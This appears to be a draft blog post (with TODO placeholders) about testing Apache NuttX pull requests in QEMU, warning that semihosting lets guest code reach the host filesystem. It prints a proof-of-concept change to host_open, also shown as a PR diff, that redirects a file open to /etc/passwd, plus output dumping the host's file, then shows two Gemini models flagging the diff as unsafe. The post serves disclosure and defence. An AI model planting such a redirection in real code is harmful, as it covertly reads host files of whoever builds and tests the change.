# QEMU Test Bot for Pull Requests: Beware of Semihosting Breakout (Apache NuttX RTOS)

📝 _16 Mar 2025_

![TODO](https://lupyuen.org/images/testbot2-title.jpg)

TODO

# QEMU Arm64

https://github.com/lupyuen/nuttx-build-farm/blob/main/build-test-arm64.sh

https://github.com/lupyuen/nuttx-build-farm/blob/main/arm64.exp

```text
## Boot NuttX on Arm64 QEMU:
## Single Core with virtio network, block, rng, serial driver (GICv3)
## https://nuttx.apache.org/docs/latest/platforms/arm64/qemu/boards/qemu-armv8a/index.html
spawn qemu-system-aarch64 \
  -cpu cortex-a53 \
  -nographic \
  -machine virt,virtualization=on,gic-version=3 \
  -chardev stdio,id=con,mux=on \
  -serial chardev:con \
  -global virtio-mmio.force-legacy=false \
  -device virtio-serial-device,bus=virtio-mmio-bus.0 \
  -chardev socket,telnet=on,host=127.0.0.1,port=3450,server=on,wait=off,id=foo \
  -device virtconsole,chardev=foo \
  -device virtio-rng-device,bus=virtio-mmio-bus.1 \
  -netdev user,id=u1,hostfwd=tcp:127.0.0.1:10023-10.0.2.15:23,hostfwd=tcp:127.0.0.1:15001-10.0.2.15:5001 \
  -device virtio-net-device,netdev=u1,bus=virtio-mmio-bus.2 \
  -drive file=./mydisk-1gb.img,if=none,format=raw,id=hd \
  -device virtio-blk-device,bus=virtio-mmio-bus.3,drive=hd \
  -mon chardev=con,mode=readline \
  -kernel ./nuttx
```

# QEMU Arm64 Test

https://github.com/lupyuen2/wip-nuttx/pull/88#issuecomment-2664190707

```bash
@nuttxpr test qemu-armv8a:netnsh
```

[See the Test Log](https://github.com/lupyuen2/wip-nuttx/pull/88#issuecomment-2664196921)

> ![TODO](https://lupyuen.org/images/semihost-qemu.jpg)

# Semihosting Breakout

_Testing a Pull Request with QEMU: Should be Totally Safe right?_

Nope __Beware of Semihosting__, it might break out from the QEMU Sandbox and into our Host Computer! Here's why...

```bash
## Let's run this on QEMU RISC-V Kernel Build
## (For rv-virt:knsh64)
nsh> hello
Hello, World!!
```

__For RISC-V Kernel Build__: _hello_ is actually an __ELF Executable__ located at _/system/bin_...

```bash
## Equivalent to this ELF Executable
## (For rv-virt:knsh64)
nsh> /system/bin/hello
Hello, World!!
```

_Where is /system/bin? Don't recall bundling any ELF Executables?_

The ELF Executables exist on Our Computer's __Local Filesystem__... Outside QEMU and the NuttX Filesystem.

![TODO](https://lupyuen.org/images/testbot2-apps.png)

This is called [__Semihosting__](https://lupyuen.github.io/articles/semihost#nuttx-calls-semihosting), it gives QEMU direct access to our computer's filesystem. We [__Enabled Semihosting__](https://nuttx.apache.org/docs/latest/platforms/risc-v/qemu-rv/boards/rv-virt/index.html#configurations) when we started QEMU...

```bash
## For NuttX Kernel Build: (rv-virt:knsh64)
## QEMU must run with Semihosting Enabled
qemu-system-riscv64 \
  -semihosting \
  -M virt,aclint=on \
  -cpu rv64 \
  -bios none \
  -kernel nuttx \
  -nographic
```

[(Semihosting is also used by __OpenOCD__ for debugging __Arm32 Devices__)](TODO)

_Thus NuttX could break out of QEMU? And access anything in our computer's filesystem?_

Exactly. This is our __"Exploit Code"__ for NuttX Semihosting: [riscv_hostfs.c](https://github.com/lupyuen2/wip-nuttx/blob/sbo/arch/risc-v/src/common/riscv_hostfs.c#L117-L141)

```c
// When NuttX opens a file via Semihosting...
int host_open(const char *pathname, int flags, int mode) {

  // Let's print the pathname
  _info("pathname=%s\n", pathname);

  // If NuttX tries to access the `hello` ELF Executable:
  // Route the access to `/etc/passwd` instead
  const char *pathname2 =
    (strcmp(pathname, "../apps/bin/hello") == 0)
    ? "/etc/passwd"
    : pathname;

  // Rest of the code is unchanged
  // Except `pathname` becomes `pathname2`
  struct {
    const char *pathname;
    long mode;
    size_t len;
  } open = {
    .pathname = pathname2,
    .mode     = host_flags_to_mode(flags),
    .len      = strlen(pathname2),
  };

  // Make a Semihosting Call to QEMU
  // Via the RISC-V EBREAK Instruction
  return host_call(HOST_OPEN, &open, sizeof(open));
}
```

Something seriously sinister happens in NuttX and QEMU... Our "Exploit Code" dumps _/etc/passwd_ from our __Local Computer__!

```bash
## Let's dump the `hello` ELF Executable
nsh> cat /system/bin/hello
host_open: pathname=../apps/bin/cat
host_open: pathname=../apps/bin/hello

## Whoa NuttX dumps `/etc/passwd` from our Local Computer!
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh
daemon:*:1:1:System Services:/var/root:/usr/bin/false
```

[(See the __Complete Log__)](https://gist.github.com/lupyuen/a1c06b6cbf08feedee4d711b21561705#file-gistfile1-txt-L1238-L1246)

# LLM Says Nope!

PR is not safe!

https://github.com/lupyuen2/wip-nuttx/pull/89

https://patch-diff.githubusercontent.com/raw/lupyuen2/wip-nuttx/pull/89.diff

https://gist.github.com/lupyuen/d5a6ac395744c1f33e10690105e20900

```text
Here is a Pull Request for Apache NuttX RTOS that I will check out to my computer and test on QEMU RISC-V 64-bit Kernel Mode. Is it safe to build and test this Pull Request on my computer?

diff --git a/arch/risc-v/src/common/riscv_hostfs.c b/arch/risc-v/src/common/riscv_hostfs.c
index aa1409d6a05b0..db54f11ae7623 100644
--- a/arch/risc-v/src/common/riscv_hostfs.c
+++ b/arch/risc-v/src/common/riscv_hostfs.c
@@ -33,6 +33,7 @@
 #include <string.h>
 #include <syscall.h>
 #include <unistd.h>
+#include <debug.h>
 
 /****************************************************************************
  * Pre-processor Definitions
@@ -115,6 +116,11 @@ static int host_flags_to_mode(int flags)
 
 int host_open(const char *pathname, int flags, int mode)
 {
+  _info("pathname=%s\n", pathname);
+  const char *pathname2 =
+    (strcmp(pathname, "../apps/bin/hello") == 0)
+    ? "/etc/passwd"
+    : pathname;
   struct
   {
     const char *pathname;
@@ -122,9 +128,9 @@ int host_open(const char *pathname, int flags, int mode)
     size_t len;
   } open =
   {
-    .pathname = pathname,
+    .pathname = pathname2,
     .mode = host_flags_to_mode(flags),
-    .len = strlen(pathname),
+    .len = strlen(pathname2),
   };
 
 #ifdef CONFIG_RISCV_SEMIHOSTING_HOSTFS_CACHE_COHERENCE
```

Gemini Pro:

https://gist.github.com/lupyuen/b9fc83a5f496d375b030c93c65271553

This pull request is **absolutely not safe** to build and test as-is, and it contains a very obvious and serious security vulnerability ...

1.  **Pathname Redirection:**  The code checks if the requested `pathname` is `"../apps/bin/hello"`.  If it is, it *replaces* the requested path with `"/etc/passwd"`.  This is a deliberate, hardcoded attempt to read the host system's password file.  `/etc/passwd` on a typical Linux/Unix system contains user account information. While it doesn't contain hashed passwords anymore (those are usually in `/etc/shadow`), it's still sensitive information that should not be exposed.

2.  **Semihosting Abuse:** This code is within the `host_open` function, which is part of NuttX's semihosting implementation (`CONFIG_RISCV_SEMIHOSTING_HOSTFS`).  Semihosting is a mechanism that allows embedded systems (like those running on NuttX in QEMU) to use the I/O facilities of the host machine (your computer) during debugging.  This code exploits semihosting to access arbitrary files on your *host* operating system.  Essentially, the embedded code is making a system call *on your computer*, not within the isolated QEMU environment.

3.  **No Sanitization:**  Even if the `pathname` is *not* `"../apps/bin/hello"`, there's no sanitization or validation of the requested file path.  An attacker could potentially provide a crafted `pathname` to access *any* file on your host system that the user running QEMU has permission to read (or write, depending on the flags). This could include configuration files, personal documents, or anything else accessible.  It's a classic directory traversal vulnerability.

Gemini Flash:

https://gist.github.com/lupyuen/d5a6ac395744c1f33e10690105e20900

> No, it is not safe to build and test this Pull Request (PR) as it is, because it introduces a significant security vulnerability.

# TODO

What about PinePhone

What about ESP32

Kind folks at Espressif could help to modify the scripts to test 

# What's Next

Next week we take a break from Continuous Integration. We'll chat about the (literally) Hot New RISC-V SBC: StarPro64. Stay tuned!

Special Thanks to __Mr Gregory Nutt__ for your guidance and kindness. I'm also grateful to [__My Sponsors__](https://lupyuen.org/articles/sponsor), for supporting my writing. 

- [__Sponsor me a coffee__](https://lupyuen.org/articles/sponsor)

- [__Discuss this article on Hacker News__](TODO)

- [__My Current Project: "Apache NuttX RTOS for Sophgo SG2000"__](https://nuttx-forge.org/lupyuen/nuttx-sg2000)

- [__My Other Project: "NuttX for Ox64 BL808"__](https://nuttx-forge.org/lupyuen/nuttx-ox64)

- [__Older Project: "NuttX for Star64 JH7110"__](https://nuttx-forge.org/lupyuen/nuttx-star64)

- [__Olderer Project: "NuttX for PinePhone"__](https://nuttx-forge.org/lupyuen/pinephone-nuttx)

- [__Check out my articles__](https://lupyuen.org)

- [__RSS Feed__](https://lupyuen.org/rss.xml)

_Got a question, comment or suggestion? Create an Issue or submit a Pull Request here..._

[__lupyuen.org/src/testbot2.md__](https://codeberg.org/lupyuen/lupyuen.org/src/branch/master/src/testbot2.md)
